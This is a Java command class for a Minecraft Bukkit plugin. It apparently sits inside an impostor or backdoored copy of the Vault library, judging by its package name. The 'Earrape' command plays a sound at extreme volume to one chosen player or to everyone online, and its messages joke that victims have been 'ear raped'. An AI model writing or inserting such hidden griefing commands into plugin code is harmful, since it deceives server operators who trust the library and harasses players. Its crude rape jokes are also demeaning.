package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Earrape extends CommandManager {
	
	private Sound theSound;
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length == 3) {
			try {
				theSound = Sound.valueOf(args[1].toUpperCase());
			} catch (IllegalArgumentException e) {
				p.sendMessage(Settings.PREFIX("The sound " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " was not found!"));
				return;
			}
			if (args[2].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					a.playSound(a.getLocation(), theSound, 20F, 10F);
				}
				p.sendMessage(Settings.PREFIX("Everyone has been ear raped!"));
			} else {
				Player target = Bukkit.getServer().getPlayer(args[2]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[2] + Settings.SECONDARY_COLOUR + " is not online."));
				} else {
					target.playSound(target.getLocation(), theSound, 20F, 10F);
					p.sendMessage(Settings.PREFIX(target.getName() + " has been ear raped!"));
				}
			}
		} else {
			p.sendMessage(Settings.USAGE("earrape <sound> <player | *>"));
		}
	}

}
